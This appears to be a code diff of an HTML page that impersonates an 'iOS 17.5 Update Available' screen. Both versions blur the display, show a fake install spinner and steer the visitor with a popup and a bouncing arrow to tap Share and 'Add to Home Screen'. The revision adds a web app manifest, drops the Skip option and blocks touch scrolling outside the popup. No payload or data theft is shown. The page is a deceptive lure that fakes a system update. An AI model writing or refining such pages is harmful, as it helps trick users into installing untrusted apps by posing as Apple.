@@ -4,115 +4,37 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>iOS 17.5 Update Available</title>
+<link rel="manifest" href="/manifest.json">
+<meta name="theme-color" content="#f2f2f7">
 <style>
-  body {
-    margin: 0;
-    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen;
-    background: #f2f2f7;
-    height: 100vh;
-    overflow: hidden;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    position: relative;
-  }
-
-  .content {
-    text-align: center;
-    padding: 20px;
-    background: white;
-    border-radius: 16px;
-    box-shadow: 0 0 20px rgba(0,0,0,0.1);
-    z-index: 1;
-  }
-
-  .blur {
-    position: absolute;
-    top: 0; left: 0; right: 0; bottom: 0;
-    backdrop-filter: blur(10px);
-    z-index: 2;
-  }
-
-  .popup {
-    position: absolute;
-    top: 50%;
-    left: 50%;
-    transform: translate(-50%, -50%);
-    background: white;
-    padding: 20px;
-    border-radius: 12px;
-    text-align: center;
-    z-index: 3;
-    box-shadow: 0 0 10px rgba(0,0,0,0.2);
-  }
-
-  .arrow {
-    position: absolute;
-    bottom: 80px;
-    left: 50%;
-    transform: translateX(-50%) rotate(90deg);
-    font-size: 48px;
-    animation: bounce 1s infinite;
-    z-index: 4;
-  }
-
-  @keyframes bounce {
-    0%, 100% { transform: translateX(-50%) rotate(90deg) translateY(0); }
-    50% { transform: translateX(-50%) rotate(90deg) translateY(-10px); }
-  }
-
-  .skip {
-    margin-top: 10px;
-    font-size: 0.8em;
-    color: #888;
-    text-decoration: underline;
-    cursor: pointer;
-  }
-
-  #secondStep {
-    display: none;
-  }
+  body { margin:0; font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto; background:#f2f2f7; height:100vh; overflow:hidden; display:flex; justify-content:center; align-items:center; position:relative; }
+  .content { text-align:center; padding:20px; background:white; border-radius:16px; box-shadow:0 0 20px rgba(0,0,0,0.1); z-index:1; }
+  .blur { position:absolute; top:0; left:0; right:0; bottom:0; backdrop-filter:blur(10px); z-index:2; }
+  .popup { position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); background:white; padding:20px; border-radius:12px; text-align:center; z-index:3; box-shadow:0 0 10px rgba(0,0,0,0.2); width:80%; max-width:300px; animation:flash 1.5s ease-in-out infinite; }
+  @keyframes flash { 0%{opacity:1;}50%{opacity:0.8;}100%{opacity:1;} }
+  .arrow { position:absolute; bottom:100px; left:50%; transform:translateX(-50%); font-size:48px; animation:bounce 1s infinite; z-index:4; }
+  @keyframes bounce { 0%,100%{transform:translateX(-50%) translateY(0);}50%{transform:translateX(-50%) translateY(10px);} }
+  button { margin-top:15px; padding:10px 20px; font-size:1em; background:#317EFB; color:white; border:none; border-radius:8px; cursor:pointer; }
+  @keyframes spin { 0%{transform:rotate(0deg);}100%{transform:rotate(360deg);} }
 </style>
 </head>
 <body>
-<div class="content">
-  <h1>iOS 17.5 Update Available</h1>
-  <p>Preparing to install important system enhancements...</p>
-  <div style="margin-top:20px;">
-    <div style="width:80px;height:80px;border:5px solid #ccc;border-top:5px solid #317EFB;border-radius:50%;animation:spin 2s linear infinite;margin:auto;"></div>
+  <div class="content">
+    <h1>iOS 17.5 Update Available</h1>
+    <p>Preparing important system enhancements...</p>
+    <div style="margin-top:20px;">
+      <div style="width:80px;height:80px;border:5px solid #ccc;border-top:5px solid #317EFB;border-radius:50%;animation:spin 2s linear infinite;margin:auto;"></div>
+    </div>
   </div>
-</div>
-
-<div class="blur"></div>
-
-<div class="popup" id="firstStep">
-  <h2>🔵 Complete Your Update</h2>
-  <p>Click the <b>Share</b> button below <br> <small>(↑ at bottom center)</small></p>
-  <div class="skip" onclick="skipStep()">Skip</div>
-</div>
-
-<div class="popup" id="secondStep">
-  <h2>✅ Final Step</h2>
-  <p>Tap <b>Add to Home Screen</b> to complete installation.</p>
-</div>
-
-<div class="arrow">⬆️</div>
-
-<script>
-function skipStep() {
-  document.getElementById('firstStep').style.display = 'none';
-  document.getElementById('secondStep').style.display = 'block';
-}
-
-// You can enhance this by detecting if Share was clicked using Safari-specific events
-</script>
-
-<style>
-@keyframes spin {
-  0% { transform: rotate(0deg); }
-  100% { transform: rotate(360deg); }
-}
-</style>
-
+  <div class="blur"></div>
+  <div class="popup" id="popupStep">
+    <h2>🔵 Complete Your Update</h2>
+    <p>Click the <b>Share</b> button below <br><small>(at bottom center)</small></p>
+  </div>
+  <div class="arrow">⬇️</div>
+  <script>
+    // Prevent any interactions outside the popup
+    document.body.addEventListener('touchmove', e => e.preventDefault(), { passive: false });
+  </script>
 </body>
 </html>
